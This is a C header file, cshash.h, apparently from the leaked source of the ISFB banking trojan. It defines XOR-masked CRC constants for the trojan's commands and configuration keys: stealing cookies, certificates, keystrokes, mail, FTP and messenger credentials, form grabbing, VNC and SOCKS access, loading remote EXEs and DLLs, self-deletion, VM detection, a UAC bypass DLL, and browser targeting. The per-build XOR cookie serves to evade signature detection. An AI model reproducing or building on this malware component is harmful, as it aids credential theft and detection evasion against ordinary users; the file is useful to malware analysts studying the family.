//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: cshash.h
// $Revision: 446 $
// $Date: 2014-12-18 19:45:59 +0300 (Чт, 18 дек 2014) $
// description:
//	Defines constant representing CRC values.
//	The idea is to xor all predefined hash values with a cookie value which can be easy modified to
//		not to keep the same constants within our module from build to build.


// Config command name CRCs
#define	CRC_NEWGRAB				(0xbb4a6203 ^ CS_COOKIE)
#define	CRC_SCREENSHOT			(0xacf9fc81 ^ CS_COOKIE)
#define	CRC_PROCESS				(0x46a71973 ^ CS_COOKIE)
#define	CRC_FILE				(0x45f5245b ^ CS_COOKIE)
#define	CRC_HIDDEN				(0x875ad1c4 ^ CS_COOKIE)
#define	CRC_VIDEO				(0x746ce763 ^ CS_COOKIE)
#define	CRC_VNC					(0xe9a0064e ^ CS_COOKIE)
#define	CRC_SOCKS				(0x162a508b ^ CS_COOKIE)

// Host process name CRCs
#define	HOST_UNKNOWN			0
#define	HOST_EX					(0x74fc6984 ^ CS_COOKIE)
#define	HOST_IE					(0x0922df04 ^ CS_COOKIE)
#define	HOST_FF					(0x662d9d39 ^ CS_COOKIE)
#define	HOST_CR					(0xc84f40f0 ^ CS_COOKIE)
#define	HOST_OP					(0x3d75a3ff ^ CS_COOKIE)
#define	HOST_SF					(0xdcfc6e80 ^ CS_COOKIE)
#define	HOST_CR_W				(0x79f2f48e ^ CS_COOKIE)
#define	HOST_OP_W				(0x48b36af9 ^ CS_COOKIE)

// Installer specific CRCs
#define	CRC_CLIENT32			(0x4f75cea7 ^ CS_COOKIE)
#define	CRC_CLIENT64			(0x90f8aab4 ^ CS_COOKIE)
#define	CRC_INST_EXE			(0x293cf63d ^ CS_COOKIE)
#define	CRC_INST_DLL			(0x7f8cf3fb ^ CS_COOKIE)
#define	CRC_INSTALL_INI			(0x7a042a8a ^ CS_COOKIE)
#define	CRC_LANGID				(0x0d20203c ^ CS_COOKIE)
#define	CRC_CHECKVM				(0x758a4250 ^ CS_COOKIE)

// INI-file values CRCs
#define	CRC_PUBLIC_KEY			(0xe1285e64 ^ CS_COOKIE)
#define	CRC_CLIENT_INI			(0xd722afcb ^ CS_COOKIE)
#define	CRC_HOSTS				(0xd0665bf6 ^ CS_COOKIE)
#define	CRC_SERVERKEY			(0x4fa8693e ^ CS_COOKIE)
#define	CRC_CONFIGTIMEOUT		(0xd7a003c9 ^ CS_COOKIE)
#define	CRC_CONFIGFAILTIMEOUT	(0x18a632bb ^ CS_COOKIE)
#define	CRC_TASKTIMEOUT			(0x31277bd5 ^ CS_COOKIE)
#define	CRC_SENDTIMEOUT			(0x955879a6 ^ CS_COOKIE)
#define	CRC_GROUP				(0x656b798a ^ CS_COOKIE)
#define	CRC_BCSERVER			(0x9fd13931 ^ CS_COOKIE)
#define	CRC_BCTIMEOUT			(0x6de85128 ^ CS_COOKIE)
#define	CRC_KNOCKERTIMEOUT		(0xacc79a02 ^ CS_COOKIE)
#define	CRC_BOOTSTRAP			(0xea9ea760 ^ CS_COOKIE)
#define	CRC_KEYLOGLIST			(0x602c2c26 ^ CS_COOKIE)
#define	CRC_SERVER				(0x556aed8f ^ CS_COOKIE)

// Command ID hashes (CRC32)
// To generate such a hash for a string use "RSAKEY -h <string>"
#define	CRC_GET_CERTS			(0x182ed6c6 ^ CS_COOKIE)
#define	CRC_GET_COOKIES			(0xad5cb533 ^ CS_COOKIE)
#define	CRC_CLR_COOKIES			(0x928a94f1 ^ CS_COOKIE)
#define	CRC_GET_SYSINFO			(0x2a77637a ^ CS_COOKIE)
#define	CRC_KILL				(0xce434422 ^ CS_COOKIE)
#define	CRC_REBOOT				(0xce54bcf5 ^ CS_COOKIE)
#define	CRC_GROUP				(0x656b798a ^ CS_COOKIE)
#define	CRC_LOAD_REG_EXE		(0x1a1424b3 ^ CS_COOKIE)
#define	CRC_LOAD_EXE			(0xae30e778 ^ CS_COOKIE)
#define	CRC_LOAD_UPDATE			(0x4f278846 ^ CS_COOKIE)
#define	CRC_GET_LOG				(0x048e750b ^ CS_COOKIE)
#define	CRC_LOAD_DLL			(0xf880e2be ^ CS_COOKIE)
#define	CRC_SLEEP				(0x0798ffe3 ^ CS_COOKIE)
#define	CRC_SEND_ALL			(0x0ef6ee49 ^ CS_COOKIE)
#define	CRC_SOCKS_START			(0xc8976148 ^ CS_COOKIE)
#define	CRC_SOCKS_STOP			(0x30bd84c4 ^ CS_COOKIE)
#define	CRC_GET_KEYLOG			(0x55b73799 ^ CS_COOKIE)
#define	CRC_GET_FILES			(0xdf794b64 ^ CS_COOKIE)
#define	CRC_GET_MAIL			(0xc41d3da7 ^ CS_COOKIE)
#define	CRC_GET_FTP				(0x23fcbe80 ^ CS_COOKIE)
#define	CRC_GET_IMS				(0x2aa9011f ^ CS_COOKIE)
#define	CRC_LOAD_PLUGIN			(0x3e6c9aaa ^ CS_COOKIE)
#define	CRC_SELF_DELETE			(0x74568157 ^ CS_COOKIE)
#define	CRC_KNOCKER_START		(0x9987d1dc ^ CS_COOKIE)
#define	CRC_KNOCKER_STOP		(0xfe0d2af5 ^ CS_COOKIE)
#define	CRC_URL_BLOCK			(0xfa2e1c73 ^ CS_COOKIE)
#define	CRC_URL_UNBLOCK			(0x620277fa ^ CS_COOKIE)
#define	CRC_FORMS_ON			(0x7e942df4 ^ CS_COOKIE)
#define	CRC_FORMS_OFF			(0xedc8cc85 ^ CS_COOKIE)
#define	CRC_GET_FORMS			(0x247310ca ^ CS_COOKIE)
#define	CRC_KEYLOG_ON			(0xb79e25bd ^ CS_COOKIE)
#define	CRC_KEYLOG_OFF			(0xe2013fb9 ^ CS_COOKIE)
#define	CRC_LOAD_INI			(0xb204e7e0 ^ CS_COOKIE)
#define	CRC_LOAD_REG_DLL		(0x4ca42175 ^ CS_COOKIE)
#define	CRC_UNREG_DLL			(0xdb73eff5 ^ CS_COOKIE)

// BK install support
#define	CRC_CVEDLL				(0x496c8315 ^ CS_COOKIE)
#define	CRC_UACDLL				(0xdcf1ed62 ^ CS_COOKIE)